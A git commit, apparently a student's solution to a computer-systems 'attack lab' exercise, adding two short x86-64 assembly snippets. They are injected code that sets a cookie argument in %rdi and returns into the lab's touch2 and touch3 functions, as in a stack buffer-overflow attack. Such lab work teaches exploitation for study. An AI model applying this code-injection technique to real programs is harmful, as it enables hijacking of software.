e895bc69f7bfe92c06fc0e84744469b65a15f68f
bysui <a971379855@hotmail.com>
2018-02-01 21:49:09 +0800

    finish attacklab

---
+++ attacklab/attacklab/c2.s
@@ -0,0 +1,3 @@
+movq	$0x59b997fa,%rdi #set cookie as the first prarameter
+pushq	$0x4017ec #push the address of touch2
+retq
---
+++ attacklab/attacklab/c3.s
@@ -0,0 +1,3 @@
+movq	$0x5561dca8,%rdi #set the address of cookie string as the first prarameter
+pushq	$0x4018fa #push the address of touch3
+retq
